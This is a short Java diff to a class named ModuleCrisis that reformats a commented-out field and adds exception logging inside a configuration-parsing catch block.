@@ -35,7 +35,7 @@ public class ModuleCrisis extends BaseModule {
 										// sincronizzazione
 	public static final int SIZE = 0x6;
 
-	//private int type;
+	// private int type;
 
 	@Override
 	public void actualStart() {
@@ -70,6 +70,10 @@ public class ModuleCrisis extends BaseModule {
 				status.setCrisis(POSITION, true);
 			}
 		} catch (ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) Error: " + e);
 			}
